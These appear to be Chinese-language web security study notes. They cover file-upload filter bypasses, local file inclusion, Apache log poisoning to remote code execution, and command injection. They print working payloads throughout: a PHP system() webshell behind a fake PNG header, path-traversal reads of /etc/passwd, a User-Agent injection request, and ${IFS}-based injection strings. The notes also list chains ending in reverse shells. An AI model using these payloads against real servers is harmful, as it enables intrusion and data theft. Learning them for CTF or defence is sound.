## WEB



### 1.文件上传类

#### 1.1 黑名单绕过

后端代码：

if(preg_match('/php|jsp|asp|exe/i',$filename)) die('nope');

1.用名单外的后缀 .php5 .phar .phtml

2.文件名夹东西: shell.php.jpg

#### 1.2 双扩展

上传:shell.php.jpg

应用过滤器:判断是.jpg

解析器:判断是.php 

#### 1.3 伪造MIME

请求头修改：Content-Type改成image/jpg

文件内容是PHP

#### 1.4 伪造图片头 图片签名

后端代码：

$info = getimagesize($file_tmp);

if($info ==  false) die ('not image')

##### 用真实文件头绕过

\x89PNG\r\n...（几字节假图片）...
<?php system($_GET['cmd']); ?>

上传后：

检测：通过

看会不会被LFI Include解析成PHP

上传成功 != 一定能够执行



### 2. 本地文件包含 LFI (把服务器上的文件"拖进来") Local File Include

后端代码：

$page = $_GET['page'];

include "page/$pages";

正常访问

?page=about.php

没有过滤构造路径

?page=../../../../etc/passwd

#### 读敏感文件

/etc/passwd

配置文件：config.php、db.php、.env

日志文件：/var/log/apache2/access.log

#### 配置上传或日志->变成RCE



### 3.log poison->Rce(remote code execution)

攻击链

1.已经找到LFI，可读:/var/log/apache2/access.log

2.Apache access.log 记录：

​	请求路径

​	User-Agent

​	Referer

3.你发一个请求，把 PHP 代码写进 UA 头：

```
GET / HTTP/1.1
Host: target
User-Agent: <?php system($_GET['cmd']); ?>
```

4.这行就会被写进 `access.log`：

```
... "<?php system($_GET['cmd']); ?>" ...
```

5.然后你用 LFI 去包含它：

```
?page=/var/log/apache2/access.log&cmd=id
```

如果WEB服务器用PHP执行这个包含文件

等于执行了注入到日志的PHP代码

LFI+可控日志=log poison Rce

上传PNG伪造头也是类似的原理

### 4. 简单日志注入

$ip = $_GET['ip'];

system("ping -c 4 $ip");

tcpdump -i tun0 icmp

tcpdump -D

;顺序执行

&&前一个成功才执行后一个

||前一个失败才执行后一个

|管道

'cmd'、$(cmd)等

${IFS} = Internal Field Separator 内部分割符

%0a(换行)

ping${IFS}-c${IFS}4${IFS}8.8.8.8;id

###  5.攻击链

链1:文件上传->Webshell->反弹Shell

链2:LFI+日志投毒->RCE->反弹Shell

链3:命令注入->反弹shell
